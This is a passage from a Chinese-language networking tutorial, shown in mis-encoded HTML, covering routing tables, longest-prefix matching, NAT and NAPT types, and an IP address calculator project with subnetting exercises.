¼<br><br>ç¤ºä¾‹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç›®çš„ç½‘ç»œ        â”‚  å­ç½‘æ©ç    â”‚   ç½‘å…³   â”‚   æ¥å£   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>     â”‚ /<span class="hljs-number">24</span>         â”‚ ç›´è¿     â”‚  eth0    â”‚<br>â”‚ <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>        â”‚ /<span class="hljs-number">8</span>          â”‚ ç›´è¿     â”‚  eth1    â”‚<br>â”‚ <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         â”‚ /<span class="hljs-number">0</span>          â”‚ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>  â”‚  eth0    â”‚<br>â”‚                 â”‚             â”‚ .<span class="hljs-number">1</span>.<span class="hljs-number">1</span>     â”‚          â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span> = é»˜è®¤è·¯ç”±ï¼ˆDefault Routeï¼‰<br>åŒ¹é…æ‰€æœ‰åœ°å€<br></code></pre></td></tr></table></figure><h3 id="4-2-è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹"><a href="#4-2-è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹" class="headerlink" title="4.2 è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹"></a>4.2 è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹</h3><p><strong>æœ€é•¿å‰ç¼€åŒ¹é…</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns">ç›®çš„åœ°å€ï¼š<span class="hljs-number">192.168.1.10</span><br><br>è·¯ç”±è¡¨ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>   â†’ åŒ¹é…âœ…ï¼ˆ<span class="hljs-number">24</span>ä½ï¼‰<br><span class="hljs-number">2</span>. <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>   â†’ åŒ¹é…âœ…ï¼ˆ<span class="hljs-number">16</span>ä½ï¼‰<br><span class="hljs-number">3</span>. <span class="hljs-number">192.0.0.0</span>/<span class="hljs-number">8</span>      â†’ åŒ¹é…âœ…ï¼ˆ<span class="hljs-number">8</span>ä½ï¼‰<br><span class="hljs-number">4</span>. <span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span>        â†’ åŒ¹é…âœ…ï¼ˆ<span class="hljs-number">0</span>ä½ï¼‰<br><br>é€‰æ‹©ï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>ï¼ˆæœ€é•¿åŒ¹é…ï¼‰<br><br>åŸåˆ™ï¼š<br>å‰ç¼€è¶Šé•¿ï¼ŒåŒ¹é…è¶Šç²¾ç¡®<br>é€‰æ‹©æœ€é•¿åŒ¹é…çš„è·¯ç”±<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±æŸ¥æ‰¾ç®—æ³•</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">çº¿æ€§æŸ¥æ‰¾ï¼š<br><span class="hljs-bullet">- </span>éå†æ‰€æœ‰è·¯ç”±<br><span class="hljs-bullet">- </span>O(n)å¤æ‚åº¦<br><span class="hljs-bullet">- </span>æ…¢<br><br>å‰ç¼€æ ‘ï¼ˆTrieï¼‰ï¼š<br><span class="hljs-bullet">- </span>äºŒå‰æ ‘æˆ–å¤šå‰æ ‘<br><span class="hljs-bullet">- </span>O(log n)å¤æ‚åº¦<br><span class="hljs-bullet">- </span>å¿«<br><br>è·¯ç”±ç¼“å­˜ï¼š<br><span class="hljs-bullet">- </span>ç¼“å­˜æœ€è¿‘ä½¿ç”¨çš„è·¯ç”±<br><span class="hljs-bullet">- </span>å¿«é€ŸæŸ¥æ‰¾<br></code></pre></td></tr></table></figure><h3 id="4-3-ç›´æ¥è·¯ç”±vsé—´æ¥è·¯ç”±"><a href="#4-3-ç›´æ¥è·¯ç”±vsé—´æ¥è·¯ç”±" class="headerlink" title="4.3 ç›´æ¥è·¯ç”±vsé—´æ¥è·¯ç”±"></a>4.3 ç›´æ¥è·¯ç”±vsé—´æ¥è·¯ç”±</h3><p><strong>ç›´æ¥è·¯ç”±ï¼ˆDirect Routingï¼‰</strong>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">ç›®çš„ä¸»æœºåœ¨åŒä¸€ç½‘ç»œ<br><br>ç¤ºä¾‹ï¼š<br>ä¸»æœº<span class="hljs-selector-tag">A</span>ï¼š<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span><br>ä¸»æœº<span class="hljs-selector-tag">B</span>ï¼š<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span><br>åŒä¸€ç½‘ç»œï¼š<span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span><br><br>è¿‡ç¨‹ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-selector-tag">A</span>æƒ³å‘é€ç»™<span class="hljs-selector-tag">B</span><br><span class="hljs-number">2</span>. æ£€æŸ¥ï¼š<span class="hljs-selector-tag">B</span>åœ¨åŒä¸€ç½‘ç»œ<br><span class="hljs-number">3</span>. ç›´æ¥å‘é€ï¼ˆé€šè¿‡ARPè·å–<span class="hljs-selector-tag">B</span>çš„MACåœ°å€ï¼‰<br><span class="hljs-number">4</span>. ä¸éœ€è¦è·¯ç”±å™¨<br></code></pre></td></tr></table></figure><p><strong>é—´æ¥è·¯ç”±ï¼ˆIndirect Routingï¼‰</strong>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">ç›®çš„ä¸»æœºåœ¨ä¸åŒç½‘ç»œ<br><br>ç¤ºä¾‹ï¼š<br>ä¸»æœº<span class="hljs-selector-tag">A</span>ï¼š<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span>ï¼ˆç½‘ç»œ<span class="hljs-number">1</span>ï¼‰<br>ä¸»æœº<span class="hljs-selector-tag">B</span>ï¼š<span class="hljs-number">10.0</span>.<span class="hljs-number">0.20</span>ï¼ˆç½‘ç»œ<span class="hljs-number">2</span>ï¼‰<br><br>è¿‡ç¨‹ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-selector-tag">A</span>æƒ³å‘é€ç»™<span class="hljs-selector-tag">B</span><br><span class="hljs-number">2</span>. æ£€æŸ¥ï¼š<span class="hljs-selector-tag">B</span>ä¸åœ¨åŒä¸€ç½‘ç»œ<br><span class="hljs-number">3</span>. æŸ¥æ‰¾è·¯ç”±è¡¨<br><span class="hljs-number">4</span>. å‘é€ç»™ç½‘å…³è·¯ç”±å™¨<br><span class="hljs-number">5</span>. è·¯ç”±å™¨è½¬å‘<br></code></pre></td></tr></table></figure><hr><h2 id="5-NATæŠ€æœ¯"><a href="#5-NATæŠ€æœ¯" class="headerlink" title="5. NATæŠ€æœ¯"></a>5. NATæŠ€æœ¯</h2><h3 id="5-1-ä¸ºä»€ä¹ˆéœ€è¦NATï¼Ÿ"><a href="#5-1-ä¸ºä»€ä¹ˆéœ€è¦NATï¼Ÿ" class="headerlink" title="5.1 ä¸ºä»€ä¹ˆéœ€è¦NATï¼Ÿ"></a>5.1 ä¸ºä»€ä¹ˆéœ€è¦NATï¼Ÿ</h3><p><strong>åœ°å€çŸ­ç¼ºé—®é¢˜</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">IPv4åœ°å€ï¼šçº¦<span class="hljs-number">43</span>äº¿ä¸ª<br>å…¨çƒéœ€æ±‚ï¼šè¿œè¶…<span class="hljs-number">43</span>äº¿<br><br>ç§æœ‰åœ°å€ï¼š<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span><br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span><br><br>é—®é¢˜ï¼š<br>ç§æœ‰åœ°å€ä¸èƒ½åœ¨äº’è”ç½‘ä¸Šè·¯ç”±<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>NATï¼ˆNetwork Address Translationï¼‰<br>ç½‘ç»œåœ°å€è½¬æ¢<br></code></pre></td></tr></table></figure><h3 id="5-2-NATå·¥ä½œåŸç†"><a href="#5-2-NATå·¥ä½œåŸç†" class="headerlink" title="5.2 NATå·¥ä½œåŸç†"></a>5.2 NATå·¥ä½œåŸç†</h3><p><strong>åŸºæœ¬NAT</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å†…éƒ¨ç½‘ç»œï¼š192.168.1.0/24ï¼ˆç§æœ‰ï¼‰<br>å¤–éƒ¨ç½‘ç»œï¼šå…¬ç½‘åœ°å€<br><br>è¿‡ç¨‹ï¼š<br><span class="hljs-bullet">1.</span> å†…éƒ¨ä¸»æœºï¼ˆ192.168.1.10ï¼‰è®¿é—®äº’è”ç½‘<br><span class="hljs-bullet">2.</span> æ•°æ®åŒ…åˆ°è¾¾NATè·¯ç”±å™¨<br><span class="hljs-bullet">3.</span> NATä¿®æ”¹æºåœ°å€ï¼š<br>   192.168.1.10 â†’ å…¬ç½‘åœ°å€ï¼ˆå¦‚1.2.3.4ï¼‰<br><span class="hljs-bullet">4.</span> å‘é€åˆ°äº’è”ç½‘<br><span class="hljs-bullet">5.</span> å“åº”è¿”å›æ—¶ï¼ŒNATä¿®æ”¹ç›®çš„åœ°å€ï¼š<br>   1.2.3.4 â†’ 192.168.1.10<br><span class="hljs-bullet">6.</span> è½¬å‘ç»™å†…éƒ¨ä¸»æœº<br></code></pre></td></tr></table></figure><p><strong>NAPTï¼ˆç«¯å£è½¬æ¢ï¼‰</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">NAPT = Network Address Port Translation<br>ä¹Ÿç§°ä¸ºPATï¼ˆPort Address Translationï¼‰<br><br>å¤šä¸ªå†…éƒ¨ä¸»æœºå…±äº«ä¸€ä¸ªå…¬ç½‘åœ°å€<br><br>ç¤ºä¾‹ï¼š<br>å†…éƒ¨ä¸»æœº<span class="hljs-keyword">A</span>ï¼š<span class="hljs-number">192.168.1.10</span>:<span class="hljs-number">5000</span><br>å†…éƒ¨ä¸»æœºBï¼š<span class="hljs-number">192.168.1.20</span>:<span class="hljs-number">6000</span><br>å…¬ç½‘åœ°å€ï¼š  <span class="hljs-number">1.2.3.4</span><br><br>NATè¡¨ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å†…éƒ¨åœ°å€:ç«¯å£     â”‚  å¤–éƒ¨åœ°å€:ç«¯å£      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ <span class="hljs-number">192.168.1.10</span>:<span class="hljs-number">5000</span>  â”‚ <span class="hljs-number">1.2.3.4</span>:<span class="hljs-number">10000</span>       â”‚<br>â”‚ <span class="hljs-number">192.168.1.20</span>:<span class="hljs-number">6000</span>  â”‚ <span class="hljs-number">1.2.3.4</span>:<span class="hljs-number">10001</span>       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>é€šè¿‡ç«¯å£åŒºåˆ†ä¸åŒçš„å†…éƒ¨ä¸»æœº<br></code></pre></td></tr></table></figure><h3 id="5-3-NATç±»å‹"><a href="#5-3-NATç±»å‹" class="headerlink" title="5.3 NATç±»å‹"></a>5.3 NATç±»å‹</h3><p><strong>Full Cone NATï¼ˆå®Œå…¨é”¥å½¢NATï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>å†…éƒ¨åœ°å€:ç«¯å£ â†’ å¤–éƒ¨åœ°å€:ç«¯å£ï¼ˆå›ºå®šæ˜ å°„ï¼‰<br><span class="hljs-bullet">- </span>ä»»ä½•å¤–éƒ¨ä¸»æœºéƒ½å¯ä»¥å‘é€åˆ°è¿™ä¸ªå¤–éƒ¨ç«¯å£<br><br>é€‚ç”¨ï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨<br><span class="hljs-bullet">- </span>P2Påº”ç”¨<br></code></pre></td></tr></table></figure><p><strong>Restricted Cone NATï¼ˆå—é™é”¥å½¢NATï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>åªæœ‰å†…éƒ¨ä¸»æœºæ›¾å‘é€è¿‡æ•°æ®çš„å¤–éƒ¨ä¸»æœºæ‰èƒ½å›å¤<br><span class="hljs-bullet">- </span>é™åˆ¶å¤–éƒ¨IP<br><br>é€‚ç”¨ï¼š<br><span class="hljs-bullet">- </span>ä¸€èˆ¬å®¢æˆ·ç«¯<br></code></pre></td></tr></table></figure><p><strong>Port Restricted Cone NATï¼ˆç«¯å£å—é™é”¥å½¢NATï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>é™åˆ¶å¤–éƒ¨IPå’Œç«¯å£<br><span class="hljs-bullet">- </span>æ›´ä¸¥æ ¼<br><br>é€‚ç”¨ï¼š<br><span class="hljs-bullet">- </span>å®‰å…¨æ€§è¦æ±‚é«˜çš„åœºæ™¯<br></code></pre></td></tr></table></figure><p><strong>Symmetric NATï¼ˆå¯¹ç§°NATï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>æ¯ä¸ªå¤–éƒ¨ç›®çš„åœ°å€éƒ½æœ‰ä¸åŒçš„æ˜ å°„<br><span class="hljs-bullet">- </span>æœ€ä¸¥æ ¼<br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">- </span>P2Pç©¿é€å›°éš¾<br></code></pre></td></tr></table></figure><h3 id="5-4-NATçš„ä¼˜ç¼ºç‚¹"><a href="#5-4-NATçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="5.4 NATçš„ä¼˜ç¼ºç‚¹"></a>5.4 NATçš„ä¼˜ç¼ºç‚¹</h3><p><strong>ä¼˜ç‚¹</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">âœ… èŠ‚çœå…¬ç½‘<span class="hljs-built_in">IP</span>åœ°å€<br>âœ… æé«˜å®‰å…¨æ€§ï¼ˆéšè—å†…éƒ¨ç»“æ„ï¼‰<br>âœ… çµæ´»çš„ç½‘ç»œè§„åˆ’<br></code></pre></td></tr></table></figure><p><strong>ç¼ºç‚¹</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">âŒ ç ´åç«¯åˆ°ç«¯è¿æ¥<br>âŒ å¢åŠ å»¶è¿Ÿ<br>âŒ æŸäº›åè®®ä¸æ”¯æŒï¼ˆå¦‚FTPä¸»åŠ¨æ¨¡å¼ï¼‰<br>âŒ P2Påº”ç”¨éœ€è¦ç‰¹æ®Šå¤„ç†ï¼ˆNATç©¿é€ï¼‰<br>âŒ è¿ååˆ†å±‚åŸåˆ™ï¼ˆä¿®æ”¹ä¼ è¾“å±‚ç«¯å£ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="6-å®æˆ˜é¡¹ç›®ï¼šIPåœ°å€è®¡ç®—å™¨"><a href="#6-å®æˆ˜é¡¹ç›®ï¼šIPåœ°å€è®¡ç®—å™¨" class="headerlink" title="6. å®æˆ˜é¡¹ç›®ï¼šIPåœ°å€è®¡ç®—å™¨"></a>6. å®æˆ˜é¡¹ç›®ï¼šIPåœ°å€è®¡ç®—å™¨</h2><h3 id="6-1-é¡¹ç›®éœ€æ±‚"><a href="#6-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="6.1 é¡¹ç›®éœ€æ±‚"></a>6.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> IPåœ°å€ä¿¡æ¯æŸ¥è¯¢<br><span class="hljs-bullet">   -</span> åœ°å€ç±»å‹ï¼ˆA/B/Cç±»ï¼‰<br><span class="hljs-bullet">   -</span> ç§æœ‰/å…¬ç½‘åœ°å€<br><span class="hljs-bullet">   -</span> ç½‘ç»œåœ°å€<br><span class="hljs-bullet">   -</span> å¹¿æ’­åœ°å€<br><span class="hljs-bullet">   -</span> å¯ç”¨ä¸»æœºèŒƒå›´<br><br><span class="hljs-bullet">2.</span> å­ç½‘åˆ’åˆ†<br><span class="hljs-bullet">   -</span> æ ¹æ®ä¸»æœºæ•°åˆ’åˆ†<br><span class="hljs-bullet">   -</span> æ ¹æ®å­ç½‘æ•°åˆ’åˆ†<br><span class="hljs-bullet">   -</span> VLSMè®¡ç®—<br><br><span class="hljs-bullet">3.</span> å­ç½‘èšåˆ<br><span class="hljs-bullet">   -</span> è·¯ç”±èšåˆè®¡ç®—<br><span class="hljs-bullet">   -</span> CIDRè¡¨ç¤º<br><br><span class="hljs-bullet">4.</span> äºŒè¿›åˆ¶è½¬æ¢<br><span class="hljs-bullet">   -</span> IPåœ°å€äºŒè¿›åˆ¶è¡¨ç¤º<br><span class="hljs-bullet">   -</span> å­ç½‘æ©ç äºŒè¿›åˆ¶è¡¨ç¤º<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> Pythonå®ç°<br><span class="hljs-bullet">-</span> å‘½ä»¤è¡Œç•Œé¢<br><span class="hljs-bullet">-</span> è¾“å…¥éªŒè¯<br><span class="hljs-bullet">-</span> å‹å¥½çš„è¾“å‡ºæ ¼å¼<br></code></pre></td></tr></table></figure><h3 id="6-2-å·¥å…·æ¼”ç¤º"><a href="#6-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="6.2 å·¥å…·æ¼”ç¤º"></a>6.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># IPåœ°å€ä¿¡æ¯æŸ¥è¯¢</span><br>python day22_ip_calculator.py --ip 192.168.1.10 --mask 255.255.255.0<br><br><span class="hljs-comment"># å­ç½‘åˆ’åˆ†</span><br>python day22_ip_calculator.py --subnet 192.168.1.0/24 --<span class="hljs-built_in">split</span> 4<br><br><span class="hljs-comment"># è·¯ç”±èšåˆ</span><br>python day22_ip_calculator.py --aggregate 192.168.0.0/24 192.168.1.0/24<br></code></pre></td></tr></table></figure><hr><h2 id="7-ä»Šæ—¥ç»ƒä¹ "><a href="#7-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="7. ä»Šæ—¥ç»ƒä¹ "></a>7. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šåœ°å€è®¡ç®—"><a href="#ç»ƒä¹ 1ï¼šåœ°å€è®¡ç®—" class="headerlink" title="ç»ƒä¹ 1ï¼šåœ°å€è®¡ç®—"></a>ç»ƒä¹ 1ï¼šåœ°å€è®¡ç®—</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> è®¡ç®—ä»¥ä¸‹IPåœ°å€çš„ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€ï¼š<br><span class="hljs-bullet">   -</span> 172.16.5.130/24<br><span class="hljs-bullet">   -</span> 10.1.2.3/16<br><span class="hljs-bullet">   -</span> 192.168.100.50/27<br><br><span class="hljs-bullet">2.</span> åˆ¤æ–­ä»¥ä¸‹åœ°å€æ˜¯å¦åœ¨åŒä¸€ç½‘ç»œï¼š<br><span class="hljs-bullet">   -</span> 192.168.1.10/24 å’Œ 192.168.1.20/24<br><span class="hljs-bullet">   -</span> 10.0.0.5/16 å’Œ 10.1.0.5/16<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†"><a href="#ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†" class="headerlink" title="ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†"></a>ç»ƒä¹ 2ï¼šå­ç½‘åˆ’åˆ†</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å°†192.168.1.0/24åˆ’åˆ†ä¸ºï¼š<br><span class="hljs-bullet">1.</span> 4ä¸ªç›¸ç­‰çš„å­ç½‘<br><span class="hljs-bullet">2.</span> 2ä¸ªå­ç½‘ï¼ˆä¸€ä¸ªéœ€è¦100å°ä¸»æœºï¼Œä¸€ä¸ªéœ€è¦50å°ï¼‰<br><span class="hljs-bullet">3.</span> 3ä¸ªå­ç½‘ï¼ˆåˆ†åˆ«éœ€è¦60ã€30ã€15å°ä¸»æœºï¼‰<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šè·¯ç”±èšåˆ"><a href="#ç»ƒä¹ 3ï¼šè·¯ç”±èšåˆ" class="headerlink" title="ç»ƒä¹ 3ï¼šè·¯ç”±èšåˆ"></a>ç»ƒä¹ 3ï¼šè·¯ç”±èšåˆ</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">èšåˆä»¥ä¸‹è·¯ç”±ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">2</span>. <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">10.0.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šå®æˆ˜åº”ç”¨"><a href="#ç»ƒä¹ 4ï¼šå®æˆ˜åº”ç”¨" class="headerlink" title="ç»ƒä¹ 4ï¼šå®æˆ˜åº”ç”¨"></a>ç»ƒä¹ 4ï¼šå®æˆ˜åº”ç”¨</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä½¿ç”¨IPè®¡ç®—å™¨å·¥å…·ï¼š<br><span class="hljs-bullet">1.</span> è§„åˆ’ä¸€ä¸ªä¼ä¸šç½‘ç»œï¼ˆ3ä¸ªéƒ¨é—¨ï¼‰<br><span class="hljs-bullet">2.</span> åˆ†é…IPåœ°å€æ®µ<br><span class="hljs-bullet">3.</span> é…ç½®è·¯ç”±å™¨ï¼ˆæ¨¡æ‹Ÿï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="8-å¸¸è§é—®é¢˜"><a href="#8-å¸¸è§é—®é¢˜" class="headerlink" title="8. å¸¸è§é—®é¢˜"></a>8. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šå­ç½‘æ©ç 